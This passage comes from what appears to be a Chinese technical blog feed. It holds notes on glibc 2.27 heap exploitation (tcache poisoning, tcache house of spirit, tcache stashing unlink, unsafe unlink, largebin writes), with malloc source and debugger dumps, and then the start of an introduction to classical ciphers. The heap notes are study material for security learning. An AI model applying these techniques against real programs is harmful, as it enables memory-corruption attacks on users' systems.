0x400620 (_start) ◂— xor    ebp, ebp// bk_nextsize设为target_addr - 0x18</span><br></pre></td></tr></table></figure><p><strong>Step 3: malloc(0x90)</strong></p><p>之后，一场好戏的开始只需要malloc一个0x100的chunk。让我们凑近点看看，下面到底会发生什么。</p><p>首先到达判断是否切割last_remainder。<font color=red><strong>注意：切割last_remainder的条件还是比较苛刻的，需要4个条件同时满足：(1) last_remainder存在，(2) 要分配的大小在small bins范围，(3) 这个last_remainder是unsorted bin里面唯一一个chunk，(4) 这个last_remainder的大小要大于(申请大小+最小chunk的大小【0x20】)。</strong></font>很明显这里第3个条件不满足，因为此时unsorted bin中不仅有p1的残余还有p3。首先将p1放入small bins（此时p1的size&#x3D;0x3f0，正好是最后一个small bins存放的大小），然后将p3放入large bins，与p2应该放在一个bins中。</p><p>将p2放入large bins的同时会将栈区的内容修改掉，步骤如下图所示，与上一篇文章的house_of_storm的流程实际上是相同的：</p><p><img src="https://img-blog.csdnimg.cn/fcea4765c18e4c10aaab01f8d6299792.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 3820~3822, Step 1, 2</span></span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">// line 3856~3859, Step 3, 4, 5, 6</span></span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">// line 3861, Step 7</span></span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">// line 3869~3872, Step 8, 9, 10, 11</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>这样就将两个栈区内容成功修改。</p><h1 id="10-mmap-overlapping-chunks"><a href="#10-mmap-overlapping-chunks" class="headerlink" title="10. mmap_overlapping_chunks"></a>10. mmap_overlapping_chunks</h1><p>经过检查，2.27的源码和2.23完全相同，这里不再赘述，本身也不难的一个漏洞，参见第4篇文章。</p><h1 id="11-overlapping-chunks"><a href="#11-overlapping-chunks" class="headerlink" title="11. overlapping_chunks"></a>11. overlapping_chunks</h1><p>这个也和2.23没什么区别，只是将chunk的大小增大到tcache无法容纳从而绕过tcache而已，也不赘述了。</p><h1 id="12-poison-null-byte"><a href="#12-poison-null-byte" class="headerlink" title="12. poison_null_byte"></a>12. poison_null_byte</h1><p>同上，略。</p><h1 id="13-tcache-house-of-spirit"><a href="#13-tcache-house-of-spirit" class="headerlink" title="13. tcache_house_of_spirit"></a>13. tcache_house_of_spirit</h1><p><strong>Step 1: 初始化堆</strong></p><p>随便malloc一块即可。</p><p><strong>Step 2: 构造栈区</strong></p><p>在栈区开0x88大小的空间，开头0x8备用。其后的0x80大小作为一个假的chunk，设置其size&#x3D;0x40。</p><p><strong>Step 3: 释放假chunk后重新分配</strong></p><p>现在将栈区的这个假chunk释放，它能够成功进入tcache。在下一次分配时也能够返回这里的地址。</p><p>整个漏洞利用的流程很简单，即tcache不会去过多检查要释放的地址，这里仅仅设置了一个size就能够成功通过检查链入tcache。要想知道为什么，我们需要查看_int_free的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>可以看到，释放时通过chunk的size来确定存入哪一个tcache中，因此要将size设置为正确的值。之后只需要这个tcache不满，就能够链入，不加任何检查，如此看来，2.27版本的tcache比fastbin还要容易利用。</p><h1 id="14-tcache-poisoning"><a href="#14-tcache-poisoning" class="headerlink" title="14. tcache_poisoning"></a>14. tcache_poisoning</h1><p>这个漏洞利用比上一个还简单，和2.23的fastbin attack类似。</p><p>分配两个大小相同的不大的chunk并释放，两个chunk进入tcache，修改任意一个chunk的fd到想要的地址，然后分配出来就行了。不多赘述。</p><h1 id="15-tcache-stashing-unlink-attack"><a href="#15-tcache-stashing-unlink-attack" class="headerlink" title="15. tcache_stashing_unlink_attack"></a>15. tcache_stashing_unlink_attack</h1><p>这个漏洞可以使malloc返回任意地址。</p><p><strong>Step 1: 构造堆、栈结构</strong></p><p>在栈上布置假chunk，大小0x80，并将bk指针指向其fd。在堆中首先分配并释放7个chunk到tcache，然后再释放2个相同大小chunk到unsorted bin。这些chunk的指针均存放在栈上，其中第0、2个chunk被释放到unsorted bin，剩余被释放到tcache，释放顺序为：3、4、5、6、7、8、1。然后分配一个大一些的chunk使unsorted bin中2个chunk进入small bins。然后分配2个tcache chunk回去使得tcache中只有5个chunk。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6036c0 —▸ 0x603620 —▸ 0x603580 —▸ 0x6034e0 —▸ 0x603440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x603390 —▸ 0x603250 —▸ 0x7ffff7dcdd30 (main_arena+240) ◂— 0x603390</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p><strong>Step 2: 修改small bins中第一个chunk（0x603390）的bk指针为栈区的假chunk。</strong></p><p><strong>Step 3: 分配一个chunk出来，即可使栈区假chunk链入tcache头部。</strong></p><p>这里使用calloc分配chunk，但是calloc还是要调用_int_malloc函数。<br>在调用之后，bins的结构变成了这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffe120 —▸ 0x6033a0 —▸ 0x6036c0 —▸ 0x603620 —▸ 0x603580 —▸ 0x6034e0 —▸ 0x603440 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x603390 —▸ 0x6036c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffe120 ◂— 0x0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>可以看到栈区假chunk被成功链入，后面跟着的是原small bins中的第二个chunk，但是地址偏移了0x10。返回的是第0个chunk，在bins中已经找不到。</p><p>我们还是通过源码来分析一下这个过程的原理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上面就是这个过程涉及的源码。可以看到这里是从末尾开始遍历small bins，发现tcache没有填满时会调用tcache_put函数将这个chunk移至tcache的头部，同时调整small bins结构。这里和fastbin类似的一点就是不会进行检查，当tcache内部指针数量达到7个时就会直接退出。</p><p>在这个示例中，_int_malloc函数首先将small bins中末尾的chunk，即0x603250弹出small bins准备后面返回，这样small bins中就只剩下了0x603390。因为我们将第一个chunk的bk改掉了，所以这里libc会误以为small bins不止一个chunk。在链入0x603390之后又会链入栈区的这个地址，而此时刚好，tcache满了，直接退出，完美。</p><p><strong>Step 4: malloc分配出栈区地址。</strong></p><p>此时栈区地址应该是写在了tcache的头部，直接malloc即可。</p><h1 id="16-unsafe-unlink"><a href="#16-unsafe-unlink" class="headerlink" title="16. unsafe_unlink"></a>16. unsafe_unlink</h1><p>2.27中关于unlink的利用与2.23类似，只是分配的chunk更大绕过了tcache而已。这里不具体分析漏洞的利用方式了，如有疑问请参考第5篇文章。这里分析一下unlink这个函数具体干了什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>unlink的第1个参数是malloc_state，一般来说就是main_arena。第2个参数是当前需要脱链的chunk。第3个chunk是P-&gt;bk，第4个为P-&gt;fd。</p><p>首先进行检查：FD-&gt;bk == BK-&gt;fd &#x3D;&#x3D; P，正常情况下这是一定成立的，这是为了防止堆结构被修改。</p><p>如果这个chunk在small bins中或者在large bins中但fd_nextsize不为空，则进行双向链表的经典脱链操作：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>。然后直接返回。**<font color=red>注意：这里需要思考一下large bins的结构，在一个large bins中由于chunk的大小不一定相同，在正常情况下，一个large bin中的chunk是按照大小有序排列的，其中bins头存放的是最大的chunk。如果一个bins中有几个chunk的大小相等，那么这些chunk一定是连接在一起的，而且只有第一个chunk拥有fd_nextsize和bk_nextsize指针，其他chunk的这两个指针为空。因为在需要遍历large bins时只需要第一个chunk有这两个指针就能够找到下一个大小不同的chunk。所以如果要进行unlink的不是有fd_nextsize的chunk，则说明这个chunk在large bins中被unlink之后无需重新调整前后fd_nextsize和bk_nextsize，因此可以和small bins一样直接脱链即可。</font>**</p><p>如果这个chunk在large bins中而且还拥有fd_nextsize，则操作要复杂很多。因为fd_nextsize和bk_nextsize需要定位前后第一个大小不同的chunk，如果将这个chunk脱链，那么fd_nextsize和bk_nextsize链也就会断裂，这个时候需要进行调整。学过数据结构的同学应该已经有思路了，这里应该分为两种情况讨论：</p><ol><li><p>如果这个bins中没有与当前chunk大小相同的chunk，那么其FD的fd_nextsize一定不为空，此时只需直接令P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize，P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize即可恢复原来的结构。</p></li><li><p>如果这个bins中有与当前chunk大小相同的chunk，为维持原有结构，我们应该将fd_nextsize和bk_nextsize赋值给下一个与其大小相同的chunk，让其作为新的nextsize结点。如果这个bins中只有这一种大小的chunk，那就直接将后面一个chunk的fd_nextsize和bk_nextsize改为其自身即可；否则对应修改后面chunk的fd_nextsize为P-&gt;fd_nextsize，bk_nextsize为P-&gt;bk_nextsize，再让前后的nextsize对应chunk指向这个chunk即可。</p></li></ol><p>由此可见，unlink仅仅完成了一个chunk的脱链操作，这个chunk应该位于small bins或large bins中。只要理解了两个bins的数据结构，就应该不难理解其中的原理。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础 Chapter 1——古典密码学</title>
      <link href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-1%E2%80%94%E2%80%94%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="Chapter-1-古典密码学"><a href="#Chapter-1-古典密码学" class="headerlink" title="Chapter 1 古典密码学"></a>Chapter 1 古典密码学</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><ol><li>密码学是提供安全服务的关键理论和技术，包含：数据机密性、数据完整性、鉴别、不可否认等。</li><li>密码学与隐写术的区别：隐写术通过隐藏消息的存在来保护消息，常用手段有：隐形墨水、字符格式变化、图形图像等，而密码学是将消息本身加密成为密文后发送，可以隐藏，也可以不隐藏，关键不在于隐藏，而在于解密。</li><li>发送者将消息通过不安全信道发送给接受者，想要确保除了接受者之外没有其他人能够阅读发送的消息。</li><li>明文：要传输的消息；密文：加密后的消息；加密：用某种方法伪装消息以隐藏其内容的过程；解密：将密文还原为明文的过程；秘钥：预先确定的用于加解密过程的参数。</li><li>加密算法：对明文加密操作采用的一组规则；解密算法：对密文解密采用的一组规则；密码算法：用于加密和解密的数学函数。</li><li>按明文处理方式可将密码分为分组密码和流密码。分组密码事先将明文分成若干组，对每组采用同样的加密方式加密，再将每组加密的密文相接形成密文。流密码分组后对每一组使用不同加密方式加密，然后将密文相接形成总的密文。按明文保密条件可分为受限制算法和基于秘钥算法。<br> (1) 受限制的算法：安全性基于算法的保密性（这种密码实际上并不安全）<br> (2) 基于密钥的算法：安全性基于密钥的安全性，算法本身可以公开。基于密钥的算法通常分为对称密码算法和公开密钥算法<font color=red>（Kerckhoffs假设）</font>。其中对称加密算法是指加密密钥和解密密钥相同或可以互相推导的密码算法，公开密钥算法的加密密钥和解密密钥实质不同，已知信息下无法相互推导（非对称密钥算法）。</li><li>加密通信模型：Alice和Bob双方通过加密机和解密机进行密文解密和明文加密，将密文通过不安全信道传输，不安全信道中有攻击者Oscar截获明文。对称密钥系统存在一个密钥源为Alice和Bob双方分配密钥，分配密钥的过程完全安全，Oscar无法窃听；非对称密钥系统中的密钥源是公开的，任何人都能够互获取，但Alice和Bob都有自己不公开的私钥用于解密。</li><li>密码体制数学描述：<br> 一个五元组$$(P, C, K, E, D)$$满足条件：<br> (1) P为可能明文的有限集（明文空间）<br> (2) C为可能密文的有限集（密文空间）<br> (3) K为一切可能密钥构成的有限集（密钥空间）<br> (4) E是加密算法的有限集<br> (5) D是解密算法的有限集<br> (6) 对 $\forall k \in K , \exist e_k \in E, \exist d_k \in D \Rightarrow e_k: P \rightarrow C, d_k: C \rightarrow P, d_k(e_k(x)) &#x3D;  x (x \in P)$ （加密函数必须为单射函数，否则一个明文可能解密出多个密文）</li><li>古典密码实现技术：<br> (1) 代换：加密将明文字符按对应关系代换为对应的密文字符，解密则反过来操作。密钥为明密文字符之间的对照关系。包含：单表代换、多表代换（维吉尼亚密码）、多字符代换等。<br> (2) 置换：将明文字符按照一定规则移动位置得到密文，字符本身不变。解密则反过来进行。密钥为移位规则。</li></ol><h2 id="二、几种古典密码"><a href="#二、几种古典密码" class="headerlink" title="二、几种古典密码"></a>二、几种古典密码</h2><ol><li><strong>移位密码</strong><br> 将字母表中每个字母向后移动若干位作为密文字符。可通过密文字符频率分析破解或暴力破解（唯密文攻击）$a b$<br> 数学描述：<br> $P &#x3D; C &#x3D; K &#x3D; Z_{26}$<br> 对$k, x, y \in Z_{26}$，定义有<br> $e_k(x) &#x3D; (x+k) \mod 26$<br> $d_k(y) &#x3D; (y-k) \mod 26$<br> k&#x3D;3时称为凯撒密码</li><li><strong>代换密码</strong><br> 建立一个明文字符与密文字符的一一对应关系，将明文对应字符替换为密文字符。也可以通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P &#x3D; C &#x3D; Z_{26}$<br> K是由26个数字0, 1, … 25所有可能的置换组成<br> 对任意置换$\pi \in K$，定义有<br> $e_\pi(x) &#x3D; \pi(x), d_\pi(y) &#x3D; \pi^{-1}(y)$</li><li><strong>仿射密码</strong><br> 其机制与移位密码类似，将明文字符通过模线性变换ax+b成为密文字符。可通过密文字符频率破解（唯密文攻击）<br> 数学描述：<br> $P &#x3D; C &#x3D; Z_{26}$<br> $K&#x3D;{(a,b)\in Z_{26}\times Z_{26}: \gcd(a,26)&#x3D;1}$<br> 对$\forall k&#x3D;(a,b)\in K， x,y\in Z_{26}$，定义<br> $e_k(x)&#x3D;(ax+b)\mod 26, d_k(y)&#x3D;a^{-1}(y-b)\mod 26$<br> 其中$\gcd(a,26)&#x3D;1$是为了满足单射的条件。<br> 当a&#x3D;1时即为移位密码</li><li><strong>维吉尼亚密码</strong><br> 维吉尼亚密码选择一个字符串作为密钥，并将明文按照字符串长度分为长度相等的若干组，对于每一组中的明文字符，按照对应位置密文的字母确定移位数量。破解方式较上述三种复杂，但仍能进行唯密文攻击。<br> 数学表述：<br> $P &#x3D; C &#x3D; K &#x3D; (Z_{26})^m$，m为正整数<br> 对$\forall k&#x3D;(k_1, k_2, …, k_m)\in K, x &#x3D; (x_1, x_2, …, x_m)\in P, y&#x3D;(y_1, y_2, …, y_m)$，定义有<br> $e_k(x)&#x3D;(x_1+k_1, x_2+k_2, …,x_m+k_m)$<br> $d_k(y)&#x3D;(y_1-k_1,y_2-k_2,…y_m-k_m)$<br> (以上运算均在模26下进行)</li><li><strong>希尔密码</strong><br> 希尔密码的加密方式可以说是仿射密码、移位密码、代换密码的超集。将明文字符串分为长度相等的若干组，对每一组进行相同的矩阵乘法（也就是一种较仿射密码更加复杂的线性变换），获取结果即为密文。<br> 数学描述：<br> $P &#x3D; C &#x3D; (Z_{26})^m$，m为不小于2的正整数<br> K是定义在$Z_{26}$上的$m\times m$可逆矩阵的集合<br> 取密钥$k \in K$，k为一个$m\times m$矩阵，记为$(k_{ij})$，对于$x&#x3D;(x_1, x_2, …, x_m)\in P, y&#x3D;(y_1, y_2, …, y_m)\in C$，定义有<br> $e_k(x)&#x3D;xk, d_k(y)&#x3D;yk^{-1}$<br> (以上运算均在模26下进行)</li><li><strong>置换密码</strong><br> 将明文打乱顺序变为密文。<br> 数学描述：<br> $P &#x3D; C &#x3D; (Z_{26})^m$，m为正整数<br> K是由所有定义在集合{1, 2, …, m}上的置换组成<br> 对于任意密钥$\pi$，定义<br> $e_\pi(x_1,x_2,…x_m)&#x3D;(x_{\pi(1)},x_{\pi(2)},…,x_{\pi(m)})$<br> $d_\pi(y_1,y_2,..,y_m)&#x3D;(y_{\pi^{-1}(1)},x_{\pi^{-1}(2)},…,x_{\pi^{-1}(m)})$<br> 置换密码实际上是希尔密码的特殊形式，其置换矩阵与排列有关。置换矩阵的行数和列数等于一组字符数量，如果这一组中明文第i个位置被换成了第j个位置的元素，则第i列的第j个数为1。</li></ol><h2 id="三-古典密码分析"><a href="#三-古典密码分析" class="headerlink" title="三. 古典密码分析"></a>三. 古典密码分析</h2><ul><li><strong>概念</strong><br>  密码分析：分析者在已知密码体制（密码算法及实现的全部详细资料）的前提下破译使用的密钥。<br>  常用密码分析攻击有4类：<br>  唯密文攻击（COA）：攻击者仅掌握密文的攻击<br>  已知明文攻击（KPA）：攻击者知道不由他控制的明文以及对应的密文<br>  选择明文攻击（CPA）：攻击者可以在一定程度上选择明文获取密文<br>  选择密文攻击（CCA）：攻击者可以在一定程度上选择密文获取明文<br>  这4种攻击方式依次增强，如果一种加密算法能够抵抗后面的攻击，那么也一定能够抵抗前面的攻击。</li><li><strong>古典密码攻击要点</strong><br>  只有当密文长度足够长时，才能够分析大多数古典密码。<br>  只能分析由有具体语义明文加密而来的密文，否则即使解密完成也不知道解密出来的是不是密文。<br>  通常需要使用英文字母频率分析与反复猜测。</li><li><strong>英文字母频率规律</strong><br>  第1档：E出现次数远多于其他字母<br>  第2档：TAOINSHR<br>  第3档：CUMWFGYPB<br>  第4档：VKJXQZ<br>  常见双字母固定序列：TH HE IN ER AN RE ED ON ES ST EN AT TO NT HA ND OU EA NG AS OR TI IS ET IT AR TE SE HI OF<br>  常见三字母固定序列：THE ING AND HER ERE ENT THA NTH WAS ETH FOR DTH<br>  根据经验，有些字母不可能组合出现与同一个单词之中，如j和所有辅音字母相邻的概率都极低。<br>  根据密文字母出现频率高低进行猜测和验证，得到密文越长，越符合统计规律</li></ul><h3 id="1-仿射密码分析"><a href="#1-仿射密码分析" class="headerlink" title="1. 仿射密码分析"></a>1. 仿射密码分析</h3><p>分析仿射密码需要得到a与b的值，通过密文中字母的出现频率猜测出现频率最高的是什么字母，只需猜测两个字母便可以列方程组求解。注意解a须与26互素，否则猜测错误。</p><h3 id="2-代换密码分析"><a href="#2-代换密码分析" class="headerlink" title="2. 代换密码分析"></a>2. 代换密码分析</h3><p>分析代换密码采用与仿射密码类似的方法，使用字频分析，逐一猜测，根据经验，最早被破译的通常是’the’，要查找文本看看有没有多次存在的3字符序列。</p><h3 id="3-维吉尼亚密码分析"><a href="#3-维吉尼亚密码分析" class="headerlink" title="3. 维吉尼亚密码分析"></a>3. 维吉尼亚密码分析</h3><p>维吉尼亚密码分析较为复杂。由于其是多表代换，因此需要首先确认每一组字符的长度，这里应该使用Kasiski测试法：在密文中找到相同的3字符或以上序列，找出它们所在的起始位置，对这些位置的差求公因数，这些公因数之一就很可能是密钥的长度。</p><p>确认密钥字长度m也可以使用重合指数法。</p><ul><li>重合指数法<ul><li>在一个字符串X中随机取出两个字母，这两个字母恰好相同的概率记为$I_c(X)$</li><li>对于完全随机字符串，$I_c(X)$&#x3D;1&#x2F;26，约为0.038</li><li>对于英文文本，$I_c(X)&#x3D;\sum_{i&#x3D;0}^{25}p_i^2\approx 0.065$</li><li>在单表代换密码中，密文的重合指数应该与明文相同。<br>将密文按照密钥字长度分为m段，每一段的重合指数应该接近于0.065，通过尝试不同的m可以获取重合指数最为接近0.065的那一个m就是密钥字长度。</li><li>对于一段确定的英文文本，计算重合指数的公式为：$I_c(X)&#x3D;\frac{\sum_{i&#x3D;0}^{25}f_i(f_i-1)}{n(n-1)}$，其中$f_i$为每个密文字母的出现次数（频数）</li><li>确认密钥的长度之后，对于分出来的每一段密文，其中每一个密文字符相对于明文字符的偏移都是相同的。这里仍然可以使用重合指数法计算偏移量。计算方法：密文转换成明文之后，其明文的重合指数应该近似于0.065，因此对于每一个偏移量，均计算一次其与明文的重合指数，最接近于0.065的即为正确偏移量。计算公式：$M_g&#x3D;\sum_{i&#x3D;0}^{25}p_i\times \frac{f_{i+g}}{n’}$，其中$p_i$为每个字母在英文中出现的概率，$f_i$是每个字母在密文中出现的次数，$n’$是这一段密文的长度。</li></ul></li></ul><h3 id="4-希尔密码分析"><a 